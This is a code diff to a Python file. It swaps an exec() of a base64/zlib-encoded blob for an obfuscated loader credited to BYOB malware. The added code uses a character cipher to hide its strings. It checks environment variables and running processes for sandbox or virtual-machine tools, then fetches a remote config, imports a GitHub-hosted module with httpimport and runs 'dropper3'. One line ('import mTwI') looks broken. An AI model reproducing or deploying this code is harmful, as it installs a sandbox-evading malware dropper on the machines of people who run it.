@@ -1,2 +1,37 @@
-import zlib,base64
-exec(zlib.decompress(base64.b64decode("eJy9Uk1v2kAQvfMrJs5hbRXsVjkFKQeHJAqqCRXQphWykMFDso29u91d8/Hvu2NDoKhVPw71xbM77828Nzvn53//tf6B05Dgpj/uJfHgdpR04e5jkkBvdHvTn4xhMoST70AaxMlj7HBJ0ouuvwyv4W44gsl9fwzj+OHmevgZeve3vfdnZ2cH0v/x1OKlktqCNK0cl4BixbUUJQrrB90WuTi6giuYvuAWllID/blwvHAHAL4E9sl5YXRP6UzkIKTdQ6ceZWeDcX/WfxhP4iSZfYgn916awvn6mduCGwuulK2yYi43jmJsVhSYE7kyqMGXotiCkoZbvkJq6DLGtSF4I4NkBlALV1ou0Bg0JLvgAkOjCu58Td8S1SkXWYlwdQVMWAZYGITOu7R2R/CdPSUVCp/ZzLyQQvZLLlOGBaHGLPeDphVVMa7fRTcl1p9rCAu5Rr0v47OQOUJaD5FtULhZrPgCWRvYylk/OVqdbeu4rIxeLZrwEK0zjTRN1t4dDngrZWHyJl7IUlW2KVqWWLI0rafq8JUWMHdQ/3g13hzmHbTqXdKV2O+Qs0qL8JPtqrPNCj5bq5qw7bp8q9BY04avRopX5EKKJX+aVbpwb+oRwXSjSGfr8Inb52pOvhzGugahMxCprVlorizqy8toIPOqQNNx79t57D+M4klUZlxEZXMfUifvtJXFDa39Xk/4hNY/qAhCyp9wHJxKuTfMcuMf1QlegWun9sjvTv1Mo5I7wtRrZM2ao5dOvR2IPNLSeGkbfoelgl56NOqjcedaKoX64ofc/jKsH+87DeKRmQ==".encode())).decode())
+####################################################
+####################################################
+# Obfuscated with PyObfx #
+import os as mTwI
+
+DTHCwIrzYv = lambda n: (n + 1) / (2 + 5)
+kZopYctmde = lambda s: ''.join(chr(int(DTHCwIrzYv(ord(c)))) for c in s)
+#### DISCLAMERL: FULL CREDITS TO                ####
+#### MALWAREDLLC/BYOB FOR THIS SANDBOX CHECK!!! ####
+####################################################
+####################################################
+
+def SvFEInfzNbhiRqmdYLjxJD():
+    SvFEInfzNbhiRqmdYLjxJD = [KsJClA for KsJClA in mTwI.environ if kZopYctmde("ýÁèă") in KsJClA and not KsJClA in [kZopYctmde("ýÁèăĘâôÖĘÖåô÷¾ßßĘë¾÷Ó")]] #whitlist virtualbox installed in user (only positive if in sandbox enviroment) 
+    dcmnkUzwuYqyZhNClp = [IodzXShH.split()[int(DTHCwIrzYv(-5)) if mTwI.name == kZopYctmde("Ņŗ") else -int(DTHCwIrzYv(-2))] for IodzXShH in mTwI.popen(kZopYctmde("ŗĞŔļĿĶŔŗ") if mTwI.name == kZopYctmde("Ņŗ") else kZopYctmde("ŋŔ")).read().splitlines()[int(DTHCwIrzYv(4)):] if IodzXShH.split()[int(DTHCwIrzYv(-5)) if mTwI.name == kZopYctmde("Ņŗ") else -int(DTHCwIrzYv(-2))].lower().split(kZopYctmde(""))[int(DTHCwIrzYv(-5))] in [kZopYctmde("ţĪŅŔĪőŝĶĤĪ"), kZopYctmde("ŝġňţŔĪőŝĶĤĪ"), kZopYctmde("ŝġňţŗőĞŦ"), kZopYctmde("ŝłŚŔőŝĤ"), kZopYctmde("ŝłŔőŝĤ"), kZopYctmde("ŝłŠĞőĪŚŔĪő"),kZopYctmde("ŝłŠĞőĪŗőĞŦ"), kZopYctmde("ŝłŗňňĿŔħ"), kZopYctmde("ŝłĤňłŋŚŗĪ"), kZopYctmde("ŝłłĪł")]]
+    import mTwI
+
+    # Running the aforementioned command and saving its output
+    KhHdtUIOQDkL = mTwI.popen(kZopYctmde("ŠłĶĤ[ŋőňĤĪŔŔ[İĪŗ[ħĪŔĤőĶŋŗĶňŅ[ŋőňĤĪŔŔĶħ")).read()
+
+    # Displaying the output
+    pAEufw = KhHdtUIOQDkL.split(kZopYctmde(""))
+    while "" in pAEufw:
+        pAEufw.remove("")
+    if len(pAEufw) < int(DTHCwIrzYv(85)): return bool(int(DTHCwIrzYv(-2)))
+
+    return bool(SvFEInfzNbhiRqmdYLjxJD + dcmnkUzwuYqyZhNClp)
+
+def SiNLRZ():
+    if not SvFEInfzNbhiRqmdYLjxJD():
+        import httpimport, requests, json
+        qQjorxLbdKAWJOIHaiUl = kZopYctmde("ĳŗŗŋŔ©őĞŠİĶŗĳŚġŚŔĪőĤňŅŗĪŅŗĤňłŋŦŔĤőĶŋŗĪő¦¦âňħŚĿĪŔĭňőĀÖåñ¾÷łĞĶŅłňħŚĿĪŔĹŔňŅ")
+        ueGrskjYLAzoBSwEQWdVCO = requests.get(qQjorxLbdKAWJOIHaiUl).text
+        rJfleaiZEuKD = json.loads(ueGrskjYLAzoBSwEQWdVCO)
+        with httpimport.github_repo(rJfleaiZEuKD[kZopYctmde("łňħŚĿĪĘĤňŅĭĶİ")][kZopYctmde("İĶŗĳŚġĘŚŔĪőŅĞłĪ")], rJfleaiZEuKD[kZopYctmde("łňħŚĿĪĘĤňŅĭĶİ")][kZopYctmde("İĶŗĳŚġĘőĪŋň")]):
+            import dropper3
+            dropper3.run()
